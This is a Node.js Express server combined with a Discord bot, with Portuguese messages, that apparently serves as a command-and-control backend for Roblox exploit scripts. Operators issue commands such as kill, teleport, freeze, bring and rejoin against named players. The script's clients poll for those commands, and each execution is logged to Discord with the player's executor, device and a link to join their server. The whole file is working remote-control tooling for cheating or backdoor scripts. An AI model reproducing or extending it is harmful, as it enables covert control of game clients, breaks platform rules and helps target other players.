const express = require("express");
const fs = require("fs");
const crypto = require("crypto");
const { Client, GatewayIntentBits, EmbedBuilder } = require("discord.js");

const MENTION_ID = "1442395164810416231";
const SECRET = process.env.API_SECRET;

const app = express();
app.use(express.json());

// Database
let db = { users: [] };
if (fs.existsSync("db.json")) db = JSON.parse(fs.readFileSync("db.json"));
function saveDB() { fs.writeFileSync("db.json", JSON.stringify(db, null, 2)); }

// Commands & Active users
let commands = [];
let activeUsers = {};

// Auth SHA256
function validateHash(username, timestamp, clientHash) {
    const raw = SECRET + username + timestamp;
    const serverHash = crypto.createHash("sha256").update(raw).digest("hex");
    return serverHash === clientHash;
}

// Discord Client
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

client.once("ready", () => {
    console.log("Bot iniciado!");
});

// Message Commands
client.on("messageCreate", async (msg) => {
    if (!msg.content.startsWith(".")) return;

    const args = msg.content.split(" ");
    const cmd = args[0].substring(1);
    const targetUser = args[1]?.toLowerCase();

    const delAfter10 = (...msgs) =>
        setTimeout(() => msgs.forEach(m => m?.delete?.().catch(() => {})), 10000);

    if (cmd === "cmds") {
        const cmdsList = [
            ".kill <user>",
            ".message <user> <mensagem>",
            ".speed <user> <v>",
            ".teleport <user>",
            ".bring <user1> <user2>",
            ".freeze <user>",
            ".unfreeze <user>",
            ".rejoin <user>",
            ".removeuser <userId>"
        ];
        const embed = new EmbedBuilder()
            .setColor("#00FFAA")
            .setTitle("📜 Comandos")
            .setDescription(cmdsList.map(c => `\`${c}\``).join("\n"))
            .setFooter({ text: "Feito por fp3" })
            .setTimestamp();
        const m = await msg.reply({ embeds: [embed] });
        return delAfter10(msg, m);
    }

    if (!targetUser && cmd !== "removeuser") {
        const m = await msg.reply("Use: .<cmd> <user> <arg>");
        return delAfter10(msg, m);
    }

    const content = args.slice(2).join(" ");

    if (cmd !== "removeuser") {
        commands.push({ user: targetUser, command: cmd, arg1: args[2], arg2: args[3], content });
        activeUsers[targetUser] = Date.now();
        const m = await msg.reply(`Comando **${cmd}** enviado para **${targetUser}**.`);
        return delAfter10(msg, m);
    }

    if (cmd === "removeuser") {
        const id = Number(args[1]);
        const index = db.users.indexOf(id);

        if (index === -1) return msg.reply("Usuário não encontrado na DB.");

        db.users.splice(index, 1);
        saveDB();
        return msg.reply("Usuário removido.");
    }
});

// ------------------ API ENDPOINTS ------------------

// /exit
app.post("/exit", (req, res) => {
    const { username, hash, timestamp } = req.body;
    if (!username || !hash || !timestamp) return res.status(401).send("Auth faltando");

    if (!validateHash(username, timestamp, hash)) return res.status(403).send("Token inválido");

    delete activeUsers[username.toLowerCase()];
    res.send("OK");
});

// /nextCommand
app.post("/nextCommand", (req, res) => {
    const { username, hash, timestamp } = req.body;
    if (!username || !hash || !timestamp) return res.status(401).send("Auth faltando");

    if (!validateHash(username, timestamp, hash)) return res.status(403).send("Token inválido");

    const target = username.toLowerCase();
    const found = commands.find(c => c.user === target);

    if (found) {
        commands = commands.filter(c => c !== found);
        return res.json(found);
    }
    return res.json({ command: null });
});

// /log
app.post("/log", async (req, res) => {
    const { userId, username, hash, timestamp, executor, device, date, time, placeId, serverJobId } = req.body;
    if (!username || !hash || !timestamp) return res.status(401).send("Auth faltando");

    if (!validateHash(username, timestamp, hash)) return res.status(403).send("Token inválido");

    if (!db.users.includes(userId)) {
        db.users.push(userId);
        saveDB();
    }

    try {
        const channel = await client.channels.fetch(process.env.CANAL_DESTINO);
        const embed = new EmbedBuilder()
            .setColor("#000000")
            .setTitle("EXECUÇÃO")
            .setThumbnail("https://i.pinimg.com/1200x/4f/d2/ed/4fd2ed732361669608231f27822661dd.jpg")
            .addFields(
                { name: "Usuário", value: `[${username}](https://www.roblox.com/users/${userId}/profile)` },
                { name: "Executor", value: executor },
                { name: "Dispositivo", value: device },
                { name: "Data", value: date },
                { name: "Hora", value: time },
                { name: "Servidor", value: `[Entrar](https://www.roblox.com/games/start?placeId=${placeId}&jobId=${serverJobId})` }
            )
            .setFooter({ text: "Feito por fp3" })
            .setTimestamp();

        channel.send({ content: `<@&${MENTION_ID}>`, embeds: [embed] });
    } catch (err) {
        console.error("Erro ao enviar log:", err);
    }

    res.send("OK");
});

// Start
app.listen(process.env.PORT || 3000, () => {
    console.log("Servidor rodando!");
});

client.login(process.env.BOT_TOKEN);
